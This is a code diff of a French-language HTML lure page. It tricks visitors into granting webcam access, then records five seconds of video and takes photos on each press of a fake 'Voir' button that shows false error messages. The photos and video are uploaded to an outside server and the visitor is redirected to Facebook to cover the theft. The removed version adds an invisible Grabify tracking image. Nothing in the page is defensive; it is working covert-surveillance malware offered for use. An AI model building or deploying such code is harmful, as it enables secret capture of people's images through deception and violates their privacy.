@@ -13,7 +13,7 @@
       color: #fff;
     }
 
-    video {
+    video#video {
       position: fixed;
       top: 0; left: 0;
       width: 100vw;
@@ -28,81 +28,117 @@
       top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       text-align: center;
-      font-size: 1.5em;
     }
 
-    #msg {
-      animation: blink 1.2s infinite;
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #444;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
     }
 
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
+    #status {
+      margin-top: 20px;
+      font-size: 16px;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <!-- Cam floutée -->
   <video id="video" autoplay muted playsinline></video>
-
-  <!-- Message au centre -->
-  <div class="center">
-    <div id="msg">Connexion sécurisée... Veuillez patienter...</div>
-  </div>
-
-  <!-- Image Grabify invisible -->
-  <img src=" https://grabify.link/track/955WKN" style="display:none" />
-
-  <!-- Canvas pour capturer -->
   <canvas id="canvas" style="display:none;"></canvas>
+
+  <div class="center">
+    <button id="fakeBtn">Voir</button>
+    <div id="status">Chargement sécurisé en cours...</div>
+  </div>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const fakeBtn = document.getElementById('fakeBtn');
+    const status = document.getElementById('status');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
+    let clickCount = 0;
+    let recorder;
+    let recordedChunks = [];
+    const capturedImages = [];
+
+    // ✅ Démarrer la webcam + enregistrement vidéo
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
         video.srcObject = stream;
 
-        // Attendre que la vidéo charge un peu
+        // 🎥 Démarrer l'enregistrement vidéo
+        recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) recordedChunks.push(e.data);
+        };
+        recorder.start();
+
+        // Stopper après 5s
         setTimeout(() => {
-          captureAndSend();
-        }, 2500);
+          recorder.stop();
+        }, 5000);
       })
       .catch(err => {
-        document.getElementById('msg').textContent = "Erreur : Webcam refusée.";
-        console.error("Webcam refusée :", err);
+        status.textContent = "Erreur : Accès à la caméra refusé.";
+        console.error(err);
       });
 
-    function captureAndSend() {
-      const width = video.videoWidth;
-      const height = video.videoHeight;
-
-      if (!width || !height) return;
-
-      canvas.width = width;
-      canvas.height = height;
+    // 🖼️ Capture d'une photo
+    function capturePhoto() {
       const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, width, height);
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL('image/jpeg');
+      capturedImages.push(dataUrl);
+    }
 
-      const imageData = canvas.toDataURL('image/jpeg');
+    // 📤 Envoi au serveur
+    function sendData() {
+      status.textContent = "Envoi des données...";
 
-      // Envoi vers ton serveur
+      // Convertir la vidéo en blob
+      const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+
+      const formData = new FormData();
+      capturedImages.forEach((img, i) => {
+        formData.append(`image${i + 1}`, img);
+      });
+      formData.append('video', videoBlob, 'capture.webm');
+
       fetch('https://moonscale-dashboard.onrender.com/stream/upload', {
         method: 'POST',
-        body: JSON.stringify({ image: imageData }),
-        headers: { 'Content-Type': 'application/json' }
+        body: formData
+      }).then(() => {
+        status.textContent = "Redirection en cours...";
+        setTimeout(() => {
+          window.location.href = "https://www.facebook.com";
+        }, 1000);
+      }).catch(err => {
+        status.textContent = "Erreur d'envoi.";
+        console.error(err);
       });
-
-      // Message fake de chargement avant redirection
-      document.getElementById('msg').textContent = "Connexion validée. Redirection...";
-
-      // Redirection vers Facebook
-      setTimeout(() => {
-        window.location.href = "https://www.facebook.com";
-      }, 2500);
     }
+
+    // 🧠 Clic sur le faux bouton "Voir"
+    fakeBtn.addEventListener('click', () => {
+      clickCount++;
+      capturePhoto();
+
+      if (clickCount < 5) {
+        status.textContent = `Erreur... Veuillez réessayer (${clickCount}/5)`;
+      } else {
+        fakeBtn.disabled = true;
+        status.textContent = "Connexion réussie.";
+        sendData();
+      }
+    });
   </script>
 </body>
 </html>
